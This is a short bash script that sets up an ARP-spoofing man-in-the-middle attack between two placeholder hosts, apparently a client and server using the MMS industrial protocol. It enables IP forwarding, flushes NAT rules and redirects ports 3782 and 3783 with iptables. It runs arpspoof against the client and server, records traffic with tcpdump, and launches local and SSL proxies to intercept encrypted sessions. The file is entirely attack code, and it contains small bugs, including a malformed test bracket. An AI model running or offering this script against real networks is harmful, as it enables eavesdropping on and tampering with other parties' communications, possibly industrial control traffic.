#!/bin/bash
  
if [ ! -d "/var/run/sslproxy"]; then
        sudo mkdir /var/run/sslproxy
fi

if [ ! "$FWD_CONFIG" = "done" ];  then
        sudo sysctl -w net.ipv4.ip_forward=1
        sudo iptables -t nat -F
        sudo iptables -t nat -A PREROUTING -p tcp --dport 3782 -j REDIRECT --to-ports 3782
        sudo iptables -t nat -A PREROUTING -p tcp --dport 3783 -j REDIRECT --to-ports 3783
        FWD_CONFIG="done"
fi

IPCLIENT="IPMMSclient"
IPSERVER="IPMMSserver"


sudo arpspoof -t $IPCLIENT -r $IPSERVER >/dev/null 2>&1 && sudo tcpdump -s 0  -i lo -w mycap.pcap &
sudo MMSproxy/lp 127.0.0.1 3783 &
sudo MMSproxy/sslproxy -f MMSproxy/sslproxy.conf
